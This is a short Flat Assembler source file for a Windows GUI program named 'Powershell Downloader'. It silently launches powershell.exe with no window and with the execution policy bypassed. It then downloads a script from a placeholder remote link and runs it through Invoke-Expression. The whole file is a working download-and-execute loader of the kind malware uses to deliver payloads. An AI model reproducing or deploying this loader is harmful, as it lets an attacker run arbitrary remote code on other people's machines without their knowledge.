FORMAT PE GUI 4.0

; Author : Suleiman Al-Othman || twitter, github (@sulealothman)
; Ver. : 0.1
; Project Name : Powershell Downloader by Flat Assembly (Fasm)

INCLUDE 'win32ax.inc'


.data

cmd db ' -ExecutionPolicy Bypass -noprofile -noexit -Command "$ameer = new-object System.Net.WebClient;Invoke-Expression $ameer.DownloadString('[DIRECT-LINK]'');"',0
pathPS db "\System32\WindowsPowershell\v1.0\powershell.exe",0

windir db "windir",0

PI PROCESS_INFORMATION
SPI STARTUPINFO

fullPathPS rb 256d

.code

	START:

        invoke GetEnvironmentVariable, windir, fullPathPS, MAX_PATH

        invoke lstrcat, fullPathPS, pathPS

        invoke CreateProcess, fullPathPS, cmd, 0, 0, 0, 0x08000000, 0, 0, SPI, PI

        invoke ExitProcess, 0

	.end START